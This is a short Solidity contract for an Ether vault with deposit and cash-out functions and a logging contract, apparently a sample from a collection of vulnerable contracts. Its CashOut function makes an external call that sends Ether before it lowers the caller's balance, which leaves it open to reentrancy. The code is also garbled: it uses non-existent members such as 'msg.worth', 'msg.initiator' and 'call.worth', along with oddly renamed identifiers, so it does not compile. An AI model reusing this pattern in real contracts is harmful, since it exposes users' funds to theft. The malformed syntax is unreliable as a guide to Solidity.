pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public playerLoot;

    Record TradefundsJournal;

    uint public FloorBankwinnings = 1 ether;

    function ETH_VAULT(address _log)
    public
    {
        TradefundsJournal = Record(_log);
    }

    function AddTreasure()
    public
    payable
    {
        if(msg.worth > FloorBankwinnings)
        {
            playerLoot[msg.initiator]+=msg.worth;
            TradefundsJournal.InsertCommunication(msg.initiator,msg.worth,"Deposit");
        }
    }

    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=playerLoot[msg.initiator])
        {
            if(msg.initiator.call.worth(_am)())
            {
                playerLoot[msg.initiator]-=_am;
                TradefundsJournal.InsertCommunication(msg.initiator,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Record
{

    struct Communication
    {
        address Caster;
        string  Info;
        uint Val;
        uint  Moment;
    }

    Communication[] public History;

    Communication EndingMsg;

    function InsertCommunication(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Caster = _adr;
        EndingMsg.Moment = now;
        EndingMsg.Val = _val;
        EndingMsg.Info = _data;
        History.push(EndingMsg);
    }
}